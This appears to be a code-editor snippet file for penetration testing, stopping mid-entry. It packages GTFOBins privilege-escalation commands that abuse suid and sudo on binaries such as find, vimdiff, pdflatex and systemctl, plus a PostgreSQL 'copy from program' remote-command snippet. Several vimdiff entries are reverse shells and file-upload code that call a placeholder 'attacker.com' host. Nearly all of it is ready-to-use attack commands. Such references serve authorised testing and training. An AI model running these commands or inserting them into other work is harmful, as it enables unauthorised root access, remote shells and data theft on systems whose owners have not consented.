{
    "find executable with suid": {
        "prefix": "find suid",
        "body": [
            "find / -perm -u=s -type f 2>/dev/null"
        ],
        "description": "find all files with suid permission"
    },
    "pty python console": {
        "prefix": "pty python",
        "body": [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ],
        "description": "spawn a pty python console"
    },
    "psql login": {
        "prefix": "psql",
        "body": [
            "psql -h ${1:\\$RHOST} -U \"${2:\\$USER}\" ${3:\\$DATABASE} ${0}"
        ],
        "description": "login to psql as postgres user"
    },
    "psql rce with copy sql query": {
        "prefix": "psql",
        "body": [
            "drop table if exists ${1:RESULT}; create table ${1:RESULT} (data text); copy ${1:RESULT} from program '${2:COMMAND}' with csv; select * from ${1:RESULT};${0}"
        ],
        "description": "execute command on remote psql server"
    },
    "head file-read (gtfobins)": {
        "prefix": "head file-read",
        "body": [
            "abuse head with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with file-read"
    },
    "head suid (gtfobins)": {
        "prefix": "head suid",
        "body": [
            "abuse head with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with suid"
    },
    "head sudo (gtfobins)": {
        "prefix": "head sudo",
        "body": [
            "abuse head with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with sudo"
    },
    "journalctl shell (gtfobins)": {
        "prefix": "journalctl shell",
        "body": [
            "abuse journalctl with shell",
            "",
            "```sh",
            "journalctl",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse journalctl with shell"
    },
    "journalctl sudo (gtfobins)": {
        "prefix": "journalctl sudo",
        "body": [
            "abuse journalctl with sudo",
            "",
            "```sh",
            "sudo journalctl",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse journalctl with sudo"
    },
    "systemctl suid (gtfobins)": {
        "prefix": "systemctl suid",
        "body": [
            "abuse systemctl with suid",
            "",
            "```sh",
            "TF=\\$(mktemp).service",
            "echo '[Service]",
            "Type=oneshot",
            "ExecStart=/bin/sh -c \"id > /tmp/output\"",
            "[Install]",
            "WantedBy=multi-user.target' > \\$TF",
            "./systemctl link \\$TF",
            "./systemctl enable --now \\$TF${0}",
            "```"
        ],
        "description": "abuse systemctl with suid"
    },
    "systemctl sudo (gtfobins)": {
        "prefix": "systemctl sudo",
        "body": [
            "abuse systemctl with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo systemctl",
            "!sh${0}",
            "```"
        ],
        "description": "abuse systemctl with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "pdflatex shell (gtfobins)": {
        "prefix": "pdflatex shell",
        "body": [
            "abuse pdflatex with shell",
            "",
            "```sh",
            "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with shell"
    },
    "pdflatex file-read (gtfobins)": {
        "prefix": "pdflatex file-read",
        "body": [
            "abuse pdflatex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "pdftotext article.pdf -${0}",
            "```"
        ],
        "description": "abuse pdflatex with file-read - The read file will be part of the output."
    },
    "pdflatex sudo (gtfobins)": {
        "prefix": "pdflatex sudo",
        "body": [
            "abuse pdflatex with sudo",
            "",
            "```sh",
            "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with sudo"
    },
    "pdflatex limited-suid (gtfobins)": {
        "prefix": "pdflatex limited-suid",
        "body": [
            "abuse pdflatex with limited-suid",
            "",
            "```sh",
            "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with limited-suid"
    },
    "arp file-read (gtfobins)": {
        "prefix": "arp file-read",
        "body": [
            "abuse arp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with file-read"
    },
    "arp suid (gtfobins)": {
        "prefix": "arp suid",
        "body": [
            "abuse arp with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with suid"
    },
    "arp sudo (gtfobins)": {
        "prefix": "arp sudo",
        "body": [
            "abuse arp with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with sudo"
    },
    "vigr suid (gtfobins)": {
        "prefix": "vigr suid",
        "body": [
            "abuse vigr with suid",
            "",
            "```sh",
            "./vigr${0}",
            "```"
        ],
        "description": "abuse vigr with suid"
    },
    "vigr sudo (gtfobins)": {
        "prefix": "vigr sudo",
        "body": [
            "abuse vigr with sudo",
            "",
            "```sh",
            "sudo vigr${0}",
            "```"
        ],
        "description": "abuse vigr with sudo"
    },
    "cmp file-read (gtfobins)": {
        "prefix": "cmp file-read",
        "body": [
            "abuse cmp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with file-read"
    },
    "cmp suid (gtfobins)": {
        "prefix": "cmp suid",
        "body": [
            "abuse cmp with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with suid"
    },
    "cmp sudo (gtfobins)": {
        "prefix": "cmp sudo",
        "body": [
            "abuse cmp with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with sudo"
    },
    "slsh shell (gtfobins)": {
        "prefix": "slsh shell",
        "body": [
            "abuse slsh with shell",
            "",
            "```sh",
            "slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with shell"
    },
    "slsh sudo (gtfobins)": {
        "prefix": "slsh sudo",
        "body": [
            "abuse slsh with sudo",
            "",
            "```sh",
            "sudo slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with sudo"
    },
    "slsh limited-suid (gtfobins)": {
        "prefix": "slsh limited-suid",
        "body": [
            "abuse slsh with limited-suid",
            "",
            "```sh",
            "./slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with limited-suid"
    },
    "ash shell (gtfobins)": {
        "prefix": "ash shell",
        "body": [
            "abuse ash with shell",
            "",
            "```sh",
            "ash${0}",
            "```"
        ],
        "description": "abuse ash with shell"
    },
    "ash file-write (gtfobins)": {
        "prefix": "ash file-write",
        "body": [
            "abuse ash with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ash with file-write"
    },
    "ash suid (gtfobins)": {
        "prefix": "ash suid",
        "body": [
            "abuse ash with suid",
            "",
            "```sh",
            "./ash${0}",
            "```"
        ],
        "description": "abuse ash with suid"
    },
    "ash sudo (gtfobins)": {
        "prefix": "ash sudo",
        "body": [
            "abuse ash with sudo",
            "",
            "```sh",
            "sudo ash${0}",
            "```"
        ],
        "description": "abuse ash with sudo"
    },
    "cupsfilter file-read (gtfobins)": {
        "prefix": "cupsfilter file-read",
        "body": [
            "abuse cupsfilter with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with file-read"
    },
    "cupsfilter sudo (gtfobins)": {
        "prefix": "cupsfilter sudo",
        "body": [
            "abuse cupsfilter with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with sudo"
    },
    "cupsfilter suid (gtfobins)": {
        "prefix": "cupsfilter suid",
        "body": [
            "abuse cupsfilter with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with suid"
    },
    "apt shell (gtfobins)": {
        "prefix": "apt shell",
        "body": [
            "abuse apt with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "apt changelog apt",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "apt sudo (gtfobins)": {
        "prefix": "apt sudo",
        "body": [
            "abuse apt with sudo, When the shell exits the `update` command is actually executed.",
            "",
            "```sh",
            "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt with sudo - When the shell exits the `update` command is actually executed."
    },
    "sshpass shell (gtfobins)": {
        "prefix": "sshpass shell",
        "body": [
            "abuse sshpass with shell",
            "",
            "```sh",
            "sshpass /bin/sh${0}",
            "```"
        ],
        "description": "abuse sshpass with shell"
    },
    "sshpass suid (gtfobins)": {
        "prefix": "sshpass suid",
        "body": [
            "abuse sshpass with suid",
            "",
            "```sh",
            "./sshpass /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse sshpass with suid"
    },
    "sshpass sudo (gtfobins)": {
        "prefix": "sshpass sudo",
        "body": [
            "abuse sshpass with sudo",
            "",
            "```sh",
            "sudo sshpass /bin/sh${0}",
            "```"
        ],
        "description": "abuse sshpass with sudo"
    },
    "aa-exec shell (gtfobins)": {
        "prefix": "aa-exec shell",
        "body": [
            "abuse aa-exec with shell",
            "",
            "```sh",
            "aa-exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse aa-exec with shell"
    },
    "aa-exec suid (gtfobins)": {
        "prefix": "aa-exec suid",
        "body": [
            "abuse aa-exec with suid",
            "",
            "```sh",
            "./aa-exec /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse aa-exec with suid"
    },
    "aa-exec sudo (gtfobins)": {
        "prefix": "aa-exec sudo",
        "body": [
            "abuse aa-exec with sudo",
            "",
            "```sh",
            "sudo aa-exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse aa-exec with sudo"
    },
    "nm file-read (gtfobins)": {
        "prefix": "nm file-read",
        "body": [
            "abuse nm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with file-read"
    },
    "nm suid (gtfobins)": {
        "prefix": "nm suid",
        "body": [
            "abuse nm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with suid"
    },
    "nm sudo (gtfobins)": {
        "prefix": "nm sudo",
        "body": [
            "abuse nm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with sudo"
    },
    "cpulimit shell (gtfobins)": {
        "prefix": "cpulimit shell",
        "body": [
            "abuse cpulimit with shell",
            "",
            "```sh",
            "cpulimit -l 100 -f /bin/sh${0}",
            "```"
        ],
        "description": "abuse cpulimit with shell"
    },
    "cpulimit suid (gtfobins)": {
        "prefix": "cpulimit suid",
        "body": [
            "abuse cpulimit with suid",
            "",
            "```sh",
            "./cpulimit -l 100 -f -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse cpulimit with suid"
    },
    "cpulimit sudo (gtfobins)": {
        "prefix": "cpulimit sudo",
        "body": [
            "abuse cpulimit with sudo",
            "",
            "```sh",
            "sudo cpulimit -l 100 -f /bin/sh${0}",
            "```"
        ],
        "description": "abuse cpulimit with sudo"
    },
    "ip file-read (gtfobins)": {
        "prefix": "ip file-read",
        "body": [
            "abuse ip with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ip -force -batch \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ip with file-read"
    },
    "ip suid (gtfobins)": {
        "prefix": "ip suid",
        "body": [
            "abuse ip with suid, This only works for Linux with CONFIG_NET_NS=y.",
            "",
            "```sh",
            "./ip netns add foo",
            "./ip netns exec foo /bin/sh -p",
            "./ip netns delete foo${0}",
            "```"
        ],
        "description": "abuse ip with suid - This only works for Linux with CONFIG_NET_NS=y."
    },
    "ip sudo (gtfobins)": {
        "prefix": "ip sudo",
        "body": [
            "abuse ip with sudo, This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.",
            "",
            "```sh",
            "sudo ip netns add foo",
            "sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar",
            "sudo ip netns exec bar /bin/sh",
            "sudo ip netns delete foo",
            "sudo ip netns delete bar${0}",
            "```"
        ],
        "description": "abuse ip with sudo - This only works for Linux with CONFIG_NET_NS=y. This version also grants network access."
    },
    "ginsh shell (gtfobins)": {
        "prefix": "ginsh shell",
        "body": [
            "abuse ginsh with shell",
            "",
            "```sh",
            "ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with shell"
    },
    "ginsh limited-suid (gtfobins)": {
        "prefix": "ginsh limited-suid",
        "body": [
            "abuse ginsh with limited-suid",
            "",
            "```sh",
            "./ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with limited-suid"
    },
    "ginsh sudo (gtfobins)": {
        "prefix": "ginsh sudo",
        "body": [
            "abuse ginsh with sudo",
            "",
            "```sh",
            "sudo ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with sudo"
    },
    "ascii-xfr file-read (gtfobins)": {
        "prefix": "ascii-xfr file-read",
        "body": [
            "abuse ascii-xfr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with file-read"
    },
    "ascii-xfr suid (gtfobins)": {
        "prefix": "ascii-xfr suid",
        "body": [
            "abuse ascii-xfr with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with suid"
    },
    "ascii-xfr sudo (gtfobins)": {
        "prefix": "ascii-xfr sudo",
        "body": [
            "abuse ascii-xfr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with sudo"
    },
    "dvips shell (gtfobins)": {
        "prefix": "dvips shell",
        "body": [
            "abuse dvips with shell",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with shell"
    },
    "dvips sudo (gtfobins)": {
        "prefix": "dvips sudo",
        "body": [
            "abuse dvips with sudo",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "sudo dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with sudo"
    },
    "dvips limited-suid (gtfobins)": {
        "prefix": "dvips limited-suid",
        "body": [
            "abuse dvips with limited-suid",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "./dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with limited-suid"
    },
    "vimdiff shell (gtfobins)": {
        "prefix": "vimdiff shell",
        "body": [
            "abuse vimdiff with shell, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with shell - This requires that `vimdiff` is compiled with Lua support."
    },
    "vimdiff reverse-shell (gtfobins)": {
        "prefix": "vimdiff reverse-shell",
        "body": [
            "abuse vimdiff with reverse-shell, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with reverse-shell - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "vimdiff non-interactive-reverse-shell (gtfobins)": {
        "prefix": "vimdiff non-interactive-reverse-shell",
        "body": [
            "abuse vimdiff with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff non-interactive-bind-shell (gtfobins)": {
        "prefix": "vimdiff non-interactive-bind-shell",
        "body": [
            "abuse vimdiff with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "vimdiff -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-upload (gtfobins)": {
        "prefix": "vimdiff file-upload",
        "body": [
            "abuse vimdiff with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "vimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-download (gtfobins)": {
        "prefix": "vimdiff file-download",
        "body": [
            "abuse vimdiff with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "vimdiff -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-write (gtfobins)": {
        "prefix": "vimdiff file-write",
        "body": [
            "abuse vimdiff with file-write",
            "",
            "```sh",
            "vimdiff ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-write"
    },
    "vimdiff file-read (gtfobins)": {
        "prefix": "vimdiff file-read",
        "body": [
            "abuse vimdiff with file-read",
            "",
            "```sh",
            "vimdiff ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-read"
    },
    "vimdiff library-load (gtfobins)": {
        "prefix": "vimdiff library-load",
        "body": [
            "abuse vimdiff with library-load, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with library-load - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff suid (gtfobins)": {
        "prefix": "vimdiff suid",
        "body": [
            "abuse vimdiff with suid, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with suid - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff sudo (gtfobins)": {
        "prefix": "vimdiff sudo",
        "body": [
            "abuse vimdiff with sudo, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with sudo - This requires that `vimdiff` is compiled with Lua support."
    },
    "vimdiff capabilities (gtfobins)": {
        "prefix": "vimdiff capabilities",
        "body": [
            "abuse vimdiff with capabilities, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with capabilities - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff limited-suid (gtfobins)": {
        "prefix": "vimdiff limited-suid",
        "body": [
            "abuse vimdiff with limited-suid, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with limited-suid - This requires that `vimdiff` is compiled with Lua support."
    },
    "flock shell (gtfobins)": {
        "prefix": "flock shell",
        "body": [
            "abuse flock with shell",
            "",
            "```sh",
            "flock -u / /bin/sh${0}",
            "```"
        ],
        "description": "abuse flock with shell"
    },
    "flock suid (gtfobins)": {
        "prefix": "flock suid",
        "body": [
            "abuse flock with suid",
            "",
            "```sh",
            "./flock -u / /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse flock with suid"
    },
    "flock sudo (gtfobins)": {
        "prefix": "flock sudo",
        "body": [
            "abuse flock with sudo",
            "",
            "```sh",
            "sudo flock -u / /bin/sh${0}",
            "```"
        ],
        "description": "abuse flock with sudo"
    },
    "gcc file-read (gtfobins)": {
        "prefix": "gcc file-read",
        "body": [
            "abuse gcc with file-read, The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gcc @\"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gcc with file-read - The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data."
    },
    "gcc file-write (gtfobins)": {
        "prefix": "gcc file-write",
        "body": [
            "abuse gcc with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "gcc -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse gcc with file-write"
    },
    "gcc shell (gtfobins)": {
        "prefix": "gcc shell",
        "body": [
            "abuse gcc with shell",
            "",
            "```sh",
            "gcc -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse gcc with shell"
    },
    "gcc sudo (gtfobins)": {
        "prefix": "gcc sudo",
        "body": [
            "abuse gcc with sudo",
            "",
            "```sh",
            "sudo gcc -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse gcc with sudo"
    },
    "exiftool file-read (gtfobins)": {
        "prefix": "exiftool file-read",
        "body": [
            "abuse exiftool with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "OUTPUT=output_file",
            "exiftool -filename=\\$OUTPUT \\$LFILE",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with file-read"
    },
    "exiftool file-write (gtfobins)": {
        "prefix": "exiftool file-write",
        "body": [
            "abuse exiftool with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "exiftool -filename=\\$LFILE \\$INPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with file-write"
    },
    "exiftool sudo (gtfobins)": {
        "prefix": "exiftool sudo",
        "body": [
            "abuse exiftool with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "sudo exiftool -filename=\\$LFILE \\$INPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with sudo"
    },
    "puppet shell (gtfobins)": {
        "prefix": "puppet shell",
        "body": [
            "abuse puppet with shell",
            "",
            "```sh",
            "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"': }\"${0}",
            "```"
        ],
        "description": "abuse puppet with shell"
    },
    "puppet file-write (gtfobins)": {
        "prefix": "puppet file-write",
        "body": [
            "abuse puppet with file-write, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=\"/tmp/${1:file_to_write}\"",
            "puppet apply -e \"file { '\\$LFILE': content => 'DATA' }\"${0}",
            "```"
        ],
        "description": "abuse puppet with file-write - The file path must be absolute."
    },
    "puppet file-read (gtfobins)": {
        "prefix": "puppet file-read",
        "body": [
            "abuse puppet with file-read, The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "puppet filebucket -l diff /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse puppet with file-read - The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed."
    },
    "puppet sudo (gtfobins)": {
        "prefix": "puppet sudo",
        "body": [
            "abuse puppet with sudo",
            "",
            "```sh",
            "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"': }\"${0}",
            "```"
        ],
        "description": "abuse puppet with sudo"
    },
    "psql shell (gtfobins)": {
        "prefix": "psql shell",
        "body": [
            "abuse psql with shell",
            "",
            "```sh",
            "psql",
            "\\?",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psql with shell"
    },
    "psql sudo (gtfobins)": {
        "prefix": "psql sudo",
        "body": [
            "abuse psql with sudo",
            "",
            "```sh",
            "psql",
            "\\?",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psql with sudo"
    },
    "joe shell (gtfobins)": {
        "prefix": "joe shell",
        "body": [
            "abuse joe with shell",
            "",
            "```sh",
            "joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with shell"
    },
    "joe limited-suid (gtfobins)": {
        "prefix": "joe limited-suid",
        "body": [
            "abuse joe with limited-suid",
            "",
            "```sh",
            "./joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with limited-suid"
    },
    "joe sudo (gtfobins)": {
        "prefix": "joe sudo",
        "body": [
            "abuse joe with sudo",
            "",
            "```sh",
            "sudo joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with sudo"
    },
    "find shell (gtfobins)": {
        "prefix": "find shell",
        "body": [
            "abuse find with shell",
            "",
            "```sh",
            "find . -exec /bin/sh \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with shell"
    },
    "find suid (gtfobins)": {
        "prefix": "find suid",
        "body": [
            "abuse find with suid",
            "",
            "```sh",
            "./find . -exec /bin/sh -p \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with suid"
    },
    "find sudo (gtfobins)": {
        "prefix": "find sudo",
        "body": [
            "abuse find with sudo",
            "",
            "```sh",
            "sudo find . -exec /bin/sh \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with sudo"
    },
    "find file-write (gtfobins)": {
        "prefix": "find file-write",
        "body": [
            "abuse find with file-write, DATA is a format string, it supports some escape sequences.",
            "",
            "```sh",
